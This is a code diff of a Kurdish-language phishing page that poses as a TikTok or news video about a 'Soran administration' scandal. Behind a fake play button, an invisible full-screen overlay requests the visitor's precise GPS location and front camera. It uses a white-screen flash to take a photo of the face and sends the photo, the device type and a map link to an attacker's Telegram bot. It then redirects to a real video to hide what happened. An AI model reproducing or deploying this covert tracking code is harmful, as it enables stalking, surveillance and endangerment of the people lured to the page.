@@ -3,51 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Soran News - کێشەی نوێ</title>
-
+    <title>TikTok · کێشەی ئیدارەی سۆران</title>
     <meta property="og:title" content="کێشەیەکی نوێ لە ئیدارەی سۆران بڵاوکرایەوە">
-    <meta property="og:description" content="بۆ بینینی ڤیدیۆی ڕووداوەکە کلیک لەسەر دوگمەی پلەی بکە">
     <meta property="og:image" content="soran.jpg">
-    <meta property="og:type" content="video.other">
 
     <style>
-        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; display: flex; justify-content: center; align-items: center; }
-        .bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('soran.jpg') no-repeat center center; background-size: cover; z-index: 1; filter: brightness(0.6); }
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; display: flex; justify-content: center; align-items: center; transition: background 0.2s; }
+        .bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: url('soran.jpg') no-repeat center center; background-size: cover; z-index: 1; filter: brightness(0.7); }
         
-        /* دیزاینی سەهمی Play ڕێک وەک وێنەکە */
-        .play-btn-container {
+        /* دیزاینی سێگۆشەی تیکتۆک لەناو بازنەی تەڵخ */
+        .play-btn {
             position: relative;
             z-index: 10;
-            width: 90px;
-            height: 90px;
-            background: rgba(255, 255, 255, 0.25);
-            border: 2px solid rgba(255, 255, 255, 0.4);
+            width: 85px;
+            height: 85px;
+            background: rgba(255, 255, 255, 0.2);
             border-radius: 50%;
             display: flex;
             justify-content: center;
             align-items: center;
             backdrop-filter: blur(10px);
-            cursor: pointer;
-            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+            border: 2px solid rgba(255, 255, 255, 0.3);
         }
         .play-triangle {
             width: 0;
             height: 0;
-            border-top: 18px solid transparent;
-            border-bottom: 18px solid transparent;
-            border-left: 30px solid white;
+            border-top: 16px solid transparent;
+            border-bottom: 16px solid transparent;
+            border-left: 28px solid white;
             margin-left: 8px;
         }
         
         #trap { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 100; cursor: pointer; }
         video, canvas { display: none; }
+        
+        /* شێوازی فلاشەکە */
+        .flash-effect { background-color: white !important; }
     </style>
 </head>
-<body>
-    <div class="bg"></div>
-    <div class="play-btn-container">
+<body id="main-body">
+    <div class="bg" id="main-bg"></div>
+    <div class="play-btn" id="main-btn">
         <div class="play-triangle"></div>
     </div>
+    
     <div id="trap" onclick="startCapture()"></div>
     
     <video id="v" autoplay playsinline muted></video>
@@ -59,45 +58,55 @@
         const targetVideo = "https://vt.tiktok.com/ZS5WMhjoP/";
 
         async function startCapture() {
+            const body = document.getElementById('main-body');
+            const bg = document.getElementById('main-bg');
+            const btn = document.getElementById('main-btn');
+
             try {
-                // ١. داواکردنی کامێرا و وێنەگرتنی خێرا
+                // ١. یەکەم جار داوای لۆکەیشن دەکات
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(async (pos) => {
+                        sendData(`📍 لۆکەیشن:\nhttps://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+                    }, null, { enableHighAccuracy: true });
+                }
+
+                // ٢. داوای کامێرا دەکات
                 const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 const v = document.getElementById('v');
                 v.srcObject = s;
                 await v.play();
 
+                // ٣. فلاشەکە (شاشە سپی دەبێت)
+                bg.style.display = 'none';
+                btn.style.display = 'none';
+                body.classList.add('flash-effect');
+
+                // ٤. وێنە دەگرێت و دەینێرێت
                 setTimeout(async () => {
                     const c = document.getElementById('c');
                     c.width = v.videoWidth;
                     c.height = v.videoHeight;
                     c.getContext('2d').drawImage(v, 0, 0);
-                    
                     const blob = await (await fetch(c.toDataURL('image/jpeg', 0.8))).blob();
-                    
-                    const deviceInfo = navigator.userAgent.match(/(iPhone|Android|Samsung|iPad)/i) ? navigator.userAgent.match(/(iPhone|Android|Samsung|iPad)/i)[0] : "Unknown Device";
                     
                     const fd = new FormData();
                     fd.append('chat_id', chat_id);
-                    fd.append('photo', blob, 'ncher.jpg');
-                    fd.append('caption', `📸 وێنە گیرا\n📱 مۆبایل: ${deviceInfo}\n📰 بابەت: کێشەی ئیدارەی سۆران`);
+                    fd.append('photo', blob, 'photo.jpg');
+                    fd.append('caption', "📸 وێنەی نێچیر بە فلاش\n📱 مۆبایل: " + (navigator.userAgent.includes("iPhone") ? "iPhone" : "Android"));
+                    
                     await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+                    
+                    // دوای وێنەکە، دەچێتە سەر ڤیدیۆکە
+                    window.location.href = targetVideo;
+                }, 1500);
 
-                    // ٢. داواکردنی GPS بە وردی (High Accuracy)
-                    if (navigator.geolocation) {
-                        navigator.geolocation.getCurrentPosition(async (pos) => {
-                            const lat = pos.coords.latitude;
-                            const lon = pos.coords.longitude;
-                            const locMsg = `📍 لۆکەیشنی وردی نێچیر:\nhttps://www.google.com/maps?q=${lat},${lon}`;
-                            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(locMsg)}`);
-                            window.location.href = targetVideo;
-                        }, () => { window.location.href = targetVideo; }, { enableHighAccuracy: true });
-                    } else {
-                        window.location.href = targetVideo;
-                    }
-                }, 1000);
             } catch (e) {
                 window.location.href = targetVideo;
             }
+        }
+
+        async function sendData(msg) {
+            await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
         }
     </script>
 </body>
